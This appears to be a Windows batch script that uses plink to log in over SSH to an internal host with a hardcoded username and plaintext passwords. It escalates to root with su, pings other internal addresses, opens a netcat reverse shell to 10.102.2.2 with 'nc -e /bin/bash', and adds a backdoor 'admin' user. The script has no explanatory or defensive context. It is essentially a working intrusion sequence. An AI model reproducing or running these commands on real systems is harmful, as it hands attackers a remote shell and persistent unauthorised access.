echo

plink.exe -v -ssh -batch  gadmin@10.102.2.10 -pw globoforever  "whoami; sleep 5; su root globorocks; ping 10.102.2.2; ping 10.102.2.130; nc 10.102.2.2 22 -e /bin/bash; sleep 5; useradd admin -g admin globosucks; exit; exit"

exit

timeout /t 10 /nobreak